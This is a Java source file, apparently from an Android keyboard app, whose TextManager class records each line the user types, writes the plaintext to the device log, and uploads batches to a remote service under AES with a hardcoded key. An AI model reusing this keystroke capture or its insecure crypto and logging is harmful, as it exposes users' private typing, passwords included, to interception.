package com.blacklotus.carekeys.logger;

import static android.content.ContentValues.TAG;

import android.annotation.SuppressLint;
import android.util.Log;

import java.security.Key;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Calendar;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

import com.blacklotus.carekeys.latin.common.Constants;
import com.blacklotus.carekeys.model.RequestTexts;
import com.blacklotus.carekeys.service.ServiceWrapper;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

@SuppressLint("NewApi")
public class TextManager {
    private static TextManager textManager;

    private ServiceWrapper serviceWrapper = new ServiceWrapper();
    final private ArrayList<String> texts = new ArrayList<>();
    private String currText = "";

    public static TextManager getInstance() {
        if (textManager == null)
            textManager = new TextManager();
        return textManager;
    }

    public void handleText(int code) {
        if (isEnter(code)) {
            saveText();
            Log.d(TAG, "TextManager: texts=" + textManager.getTexts());
            Log.d(TAG, "TextManager: encryptedTexts=" + Arrays.toString(encryptArray(
                    textManager.texts.toArray(new String[]{}
                    ))));
        }
        else if (isDelete(code))
            deleteChar();
        else
            addChar(Constants.userReadableCode(code));
    }

    private void addChar(String ch) {
        currText += ch;
    }

    private void saveText() {
        if (currText.isEmpty()) return;
        texts.add(currText);
        currText = "";

        if (texts.size() == com.blacklotus.carekeys.util.Constants.THRESHOLD_OPENAI) {
            Log.d(TAG, "Size exceeded 5, making API call ...");

            Calendar calendar = Calendar.getInstance();
            String timestamp = calendar.get(Calendar.YEAR) + "-" +
                    calendar.get(Calendar.MONTH) + "-" +
                    calendar.get(Calendar.DATE) + " " +
                    calendar.get(Calendar.HOUR_OF_DAY) + ":" +
                    calendar.get(Calendar.MINUTE) + ":" +
                    calendar.get(Calendar.SECOND);

            RequestTexts requestTexts = new RequestTexts(
                    timestamp,
                    encryptArray(texts.toArray(new String[] {}))
            );
            serviceWrapper.texts(
                    requestTexts,
                    new Callback<Void>() {
                        @Override
                        public void onResponse(Call<Void> call, Response<Void> response) {
                            // flush
                            texts.clear();
                        }

                        @Override
                        public void onFailure(Call<Void> call, Throwable t) {

                        }
                    }
            );
        }
    }

    private void deleteChar() {
        if (currText.length() == 0) return;
        currText = currText.substring(0, currText.length() - 1);
    }

    public String getCurrText() {
        return currText;
    }

    public String getTexts() {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        sb.append('\n');
        for (String text : texts) {
            sb.append("\t");
            sb.append(text);
            sb.append('\n');
        }
        sb.append("]");
        return sb.toString();
    }

    private boolean isDelete(final int code) {
        return code == Constants.CODE_DELETE;
    }

    private boolean isEnter(final int code) {
        return code == Constants.CODE_ENTER;
    }

    @SuppressLint("NewApi")
    public static String[] encryptArray(String[] inputArray) {
        try {
            Key aesKey = new SecretKeySpec(Arrays.copyOf("1234567890123456".getBytes("UTF-8"), 16), "AES");
            Cipher cipher = Cipher.getInstance("AES");
            cipher.init(Cipher.ENCRYPT_MODE, aesKey);
            String[] encryptedArray = new String[inputArray.length];
            for (int i = 0; i < inputArray.length; i++) {
                byte[] encrypted = cipher.doFinal(inputArray[i].getBytes("UTF-8"));
                encryptedArray[i] = Base64.getEncoder().encodeToString(encrypted);
            }
            return encryptedArray;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
